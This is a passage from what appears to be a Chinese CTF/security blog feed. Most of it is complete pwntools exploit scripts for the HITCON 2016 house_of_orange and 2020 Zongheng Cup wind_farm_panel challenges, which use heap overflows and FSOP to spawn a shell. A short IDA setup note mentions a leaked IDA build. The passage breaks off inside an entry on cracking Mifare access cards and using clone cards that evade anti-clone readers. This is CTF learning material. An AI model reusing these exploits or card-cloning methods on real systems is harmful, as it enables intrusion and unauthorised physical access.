class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./houseoforange_hitcon_2016&quot;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29595</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./houseoforange_hitcon_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content, price, color</span>):</span></span><br><span class="line">command(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name :&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">command(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">size, content, price, color</span>):</span></span><br><span class="line">command(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"><span class="comment"># step1 &#x27;free&#x27; 2 bin</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="number">0xddaa</span>,<span class="number">0xddaa</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0xfa1</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload,<span class="number">0xddaa</span>,<span class="number">0xddaa</span>)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>,<span class="number">0xddaa</span>,<span class="number">0xddaa</span>)</span><br><span class="line"><span class="comment">#0x555555758000     0x555555779000 rw-p    21000 0      [heap]</span></span><br><span class="line"><span class="comment">#0x555555758000     0x55555579b000 rw-p    43000 0      [heap]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step2 leak libc</span></span><br><span class="line">add(<span class="number">0x450</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>,<span class="number">0xddaa</span>,<span class="number">0xddaa</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_addr = leak_addr-<span class="number">1640</span>-<span class="number">0x3c4b20</span></span><br><span class="line">log.info(<span class="string">&quot;libc_addr:&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">IO_list_all=libc_addr+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;IO_list_all:&quot;</span>+<span class="built_in">hex</span>(IO_list_all))</span><br><span class="line">system=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># step3 leak heap</span></span><br><span class="line">payload = <span class="string">&#x27;d&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">edit(<span class="number">0x10</span>, payload,<span class="number">0xddaa</span>,<span class="number">0xddaa</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;heap_addr:&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># set fake struct</span></span><br><span class="line">payload=<span class="string">&#x27;d&#x27;</span>*<span class="number">0x450</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x0000ddaa00000003</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake = <span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake = fake.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake += p64(heap_addr+<span class="number">0x558</span>) <span class="comment">#vtable</span></span><br><span class="line">fake += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake += p64(system)</span><br><span class="line">payload += fake</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink attack</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice : &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><ul><li><a href="https://www.cnblogs.com/shangye/p/6268981.html">ctf-HITCON-2016-houseoforange学习</a></li><li><a href="https://blog.csdn.net/weixin_44145820/article/details/105270036">houseoforange_hitcon_2016（House of orange， unsorted bin attack，FSOP）</a></li><li><a href="https://www.jianshu.com/p/1e45b785efc1">house_of_orange</a></li></ul><h3 id="2020-纵横杯-wind-farm-panel"><a href="#2020-纵横杯-wind-farm-panel" class="headerlink" title="2020_纵横杯_wind_farm_panel"></a>2020_纵横杯_wind_farm_panel</h3><h4 id="基本情况-1"><a href="#基本情况-1" class="headerlink" title="基本情况"></a>基本情况</h4><p>十分明显的堆溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">edit</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please modify your personal information.\nWhich turbine: &quot;</span>);</span><br><span class="line">  v3 = read_int(<span class="string">&quot;Please modify your personal information.\nWhich turbine: &quot;</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( !*((_QWORD *)&amp;area + v3) || v3 &lt; <span class="number">0</span> || v3 &gt; <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Unvalidated Input&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *((<span class="keyword">void</span> **)&amp;area + v3), <span class="number">0x1000</span>uLL);   <span class="comment">// 堆溢出</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>满足 <code>house_of_orange</code> 的条件：堆溢出能修改 topchunk size ；申请 size 限制范围大；没有 free 功能。</p><ol><li>溢出修改 topchunk size ，申请大于 topchunk 的堆，将 topchunk 放入 unsortedbin ，然后泄露 libc 地址</li><li>修复 chunk_size&amp;pre_size ，申请 larginbin 泄露 heap_addr</li><li>FSOP</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># overwrite topchunk size</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0xf71</span>))</span><br><span class="line"><span class="comment"># frow topchunk into unsortedbin</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xfff</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">88</span>-<span class="number">0x3c4b20</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p>申请 larginbin 之前，需要修复泄露 libc 破坏的 chunk_size ，以后布置 prev_size ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># repair chunk_size&amp;prev_size</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0xf71</span>)+p64(libc_base+<span class="number">88</span>+<span class="number">0x3c4b20</span>)*<span class="number">2</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">0xf50</span>+p64(<span class="number">0xf70</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Done&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># larginbin leak heap addr</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x450</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xa0</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x90</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;182.92.203.154&quot;,28452)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc-2.23.so&quot;)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span></span><br><span class="line">command(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">command(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">command(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite topchunk size</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0xf71</span>))</span><br><span class="line"><span class="comment"># free topchunk into unsortedbin</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xfff</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">88</span>-<span class="number">0x3c4b20</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># repair chunk_size&amp;prev_size</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0xf71</span>)+p64(libc_base+<span class="number">88</span>+<span class="number">0x3c4b20</span>)*<span class="number">2</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">0xf50</span>+p64(<span class="number">0xf70</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Done&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># larginbin leak heap addr</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x450</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xa0</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x90</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0x461</span>))</span><br><span class="line"></span><br><span class="line">IO_list_all=libc_base+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;IO_list_all:&quot;</span>+<span class="built_in">hex</span>(IO_list_all))</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># FSOP</span></span><br><span class="line"><span class="comment"># set fake struct</span></span><br><span class="line"><span class="comment">#payload=&#x27;a&#x27;*0x450+p64(0)+p64(0x21)+p64(0x0000ddaa00000003)+p64(0)</span></span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span>*<span class="number">0x450</span></span><br><span class="line">fake = <span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake = fake.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake += p64(heap_base+<span class="number">0x5c8</span>) <span class="comment"># vtable</span></span><br><span class="line">fake += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake += p64(system)</span><br><span class="line">payload += fake</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = &#x27;b&#x27;*0x458+p64(0x60)</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0xc2e)&#x27;)</span></span><br><span class="line"></span><br><span class="line">command(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x80</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> i春秋 </tag>
            
            <tag> house of orange </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac ida 配置</title>
      <link href="archives/499a2943/"/>
      <url>archives/499a2943/</url>
      
        <content type="html"><![CDATA[<h1 id="Mac-ida-配置"><a href="#Mac-ida-配置" class="headerlink" title="Mac ida 配置"></a>Mac ida 配置</h1><p>版本是飘云阁泄露的 7.5 绿色全插件版。运行在正版 crossover 上，里面容器是 win10 64bit ，安装了 python 3.9。</p><p>安装 rizzo 这种作者自己写的库直接复制到 plugin 就能用了，但是遇到 findcryto 这种复制文件到 plugin 之后还需要 pip 安装额外库的现在遇到一点问题。</p><p>就是 pip 直接安装会遇到 <code>Microsoft visual c++ 14.0 is required</code> 问题，所以采取去 pypi 下载 whl 文件直接安装，但是部分库没有提供 py39 win64 amd 对应的文件，所以安装不上只能等待更新</p><p>crossover 打开终端窗口需要每次自己手动打开，路径为：”/Users/skye/Library/Application Support/CrossOver/Bottles/IDA Pro 7.5/drive_c/windows/system32/cmd.exe”</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/ting0922/article/details/82355663">https://blog.csdn.net/ting0922/article/details/82355663</a></p><p><a href="https://blog.csdn.net/u014081841/article/details/80842705">https://blog.csdn.net/u014081841/article/details/80842705</a></p><p><a href="https://blog.csdn.net/ting0922/article/details/82355663">https://blog.csdn.net/ting0922/article/details/82355663</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nfc破解</title>
      <link href="archives/3e6c85d9/"/>
      <url>archives/3e6c85d9/</url>
      
        <content type="html"><![CDATA[<h2 id="NFC卡分类"><a href="#NFC卡分类" class="headerlink" title="NFC卡分类"></a>NFC卡分类</h2><p>常用的NFC卡可以分为ID卡和IC卡。ID卡全称身份识别卡(Identification Card)，为低频卡，工作频率为 125KHz-1000Khz（与大部分手机、<a href="https://www.smzdm.com/fenlei/chuandaishebei/">智能设备</a>工作频率不同，无法模拟），编号固定，卡号公开，不可写入数据，逐步淘汰中。IC卡全称集成电路卡(Integrated Circuit Card)，又称智能卡(Smart Card)，工作频率为 13.56MHz（与大部分手机 NFC 频率一样，可模拟）。</p><h2 id="IC卡类型"><a href="#IC卡类型" class="headerlink" title="IC卡类型"></a>IC卡类型</h2><p>常用IC卡主要有以下类型（以下介绍来自网络）：</p><p>**Mifare S50（M1）:**MIFARE Classic是恩智浦半导体开发的可用于非接触式智能卡，符合ISO/IEC 14443 A类标准。用于公共交通票证等应用，还可用于各类其他应用有S20，S50(M1)，S70几种规格，主要是根据存储器容量划分，存储器容量分别有320B，1K，4K。具有以下防干扰、轻松简便以及安全等特性。日常使用的电梯卡、门禁卡等智能卡发卡商所使用的都是 M1 卡，可以理解为物业发的原卡（母卡）。常见校园卡、公交卡等也是 M1 卡。M1 卡仅仅适合发卡方发新卡使用。</p><p><strong>CPU卡：</strong>CPU卡芯片内含有一个微处理器，配合操作系统即片上 OS，可以达到金融级别的安全等级。适用于金融、保险、交警、政府行业等多个领域。CPU 卡由 CPU 部分 7K 以及 M1 部分 1K 组成，最多破解其中 M1 部分，CPU 区域数据无法破解。实际上由于 CPU 部分和 M1 部分的数据会交互，所以基本上 CPU 卡无法破解。</p><h3 id="IC复制卡种类"><a href="#IC复制卡种类" class="headerlink" title="IC复制卡种类"></a>IC复制卡种类</h3><p><strong>UID卡：</strong>普通 IC 复制卡，可以重复擦写所有扇区。UID 可被重复修改，响应后门指令（意味着可被使用后门指令检测是否为克隆卡的机器发现），遇到带有防火墙的读卡器就会失效。</p><p><strong>CUID卡：</strong>UID的升级版，可擦写防屏蔽卡，可以重复擦写所有扇区，不响应后门指令(意味着不容易被反克隆系统发现)，可以绕过防火墙。</p><p>目前IC卡主要有UID,CUID,FUID,UFUID,这几种，其中CUID是天朝人民发明的卡，被国外成为Chinese magic card，因为他能更改0扇区卡号。</p><p>CUID,FUID,UFUID 卡都带有防火墙，CUID可以重复擦写所有扇区，FUID,UFUID为一次性的卡，0扇区只能写一次就被锁死了，不能更换。</p><p>一般我们读出了母卡数据，如果是静态数据，先用UID写卡，看复制卡是否能使用，如果不能再用CUID试，CUID目前是市面上使用最多的卡种，如果依旧不行，继续用FUID和UFUID试试看。</p><h2 id="M1-卡结构"><a href="#M1-卡结构" class="headerlink" title="M1 卡结构"></a>M1 卡结构</h2><p>Mifare Classic提供1k-4k的容量，现在国内采用的多数是Mifare Classic 1k(S50)[后面简称M1卡]。</p><p>M1卡有从0到15共16个扇区，每个扇区配备了从0到3共4个段，每个段可以保存16字节的内容。</p><p>每个扇区的第4个段（也就是3段）是用来保存KeyA，KeyB和控制位的，因为M1卡允许每个扇区有一对独立的密码保护，这样能够更加灵活的控制数据的操作，控制位就是这个扇区各种详细权限计算出来的结果。</p><p>每张M1卡都有一个全球唯一的UID号，这个UID号保存在卡的第一个扇区（0扇区）的第一段（0段），也称为厂商段，其中前4个字节是卡的UID，第5个字节是卡UID的校验位，剩下的是厂商数据，并且这个段在出厂之前就会被设置了写入保护，只能读取不能修改，当然也有例外就是各种复制卡。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210202153449.png" alt="img"></p><h2 id="M1-卡破解方法"><a href="#M1-卡破解方法" class="headerlink" title="M1 卡破解方法"></a>M1 卡破解方法</h2><ol><li><p>暴力破解</p><p>M1卡是被动卡，需要读卡器为它提供能量，一旦读卡器切断了电源，卡中的临时数据就会丢失，永远不会因为密码输入错误太多而被锁定。</p></li><li><p>重放攻击</p><p>重放攻击是基于M1卡的PRNG算法漏洞实现。当卡接近读卡器获得能量的时候，就会开始生成随机数序列，因为卡是被动式卡，也就是随机数是依靠（基于LSRF的PRNG）算法生成的。</p></li><li><p>克隆卡片</p><p>需要用到 uid、cuid 等克隆卡片</p></li><li><p>密钥流窃听</p><p>利用 proxmark 3 嗅探到全加密 M1卡。在卡和已经授权的读卡器交换数据的时候进行窃听，就能读取 tag 数据，利用 XOR 算 key 工具就可以把扇区的密钥计算出来，这也是PRNG算法的漏洞所导致的</p></li><li><p>验证漏洞</p><p>验证漏洞是目前使用最多的M1破解手段，在读卡器尝试去读取一个扇区时，卡会首先发一个随机数给读卡器，读卡器接到随机数之后利用自身的算法加密这个随机数再反馈回给卡，卡再用自己的算法计算一次，发现结果一致的话就认为读卡器是授权了的，然后就用开始自己的算法加密会话并跟读卡器进行传送数据。这时候问题就来了，当我们再次尝试去访问另一个扇区，卡片又会重复刚才那几个步骤，但此时卡跟读卡器之间的数据交换已经是被算法加密了的，而这个算法又是由扇区的密钥决定的，所以密钥就被泄露出来了。因此验证漏洞要求我们至少知道一个扇区的密钥，但目前大部分的扇区都没有全部加密，所以很容易就会被破解。</p></li></ol><h2 id="基于-pn532-m1T-破解实战"><a href="#基于-pn532-m1T-破解实战" class="headerlink" title="基于 pn532 + m1T 破解实战"></a>基于 pn532 + m1T 破解实战</h2><h3 id="工具列表"><a href="#工具列表" class="headerlink" title="工具列表"></a>工具列表</h3><ul><li>PN532 （含 ch340 或其他 ttl 转 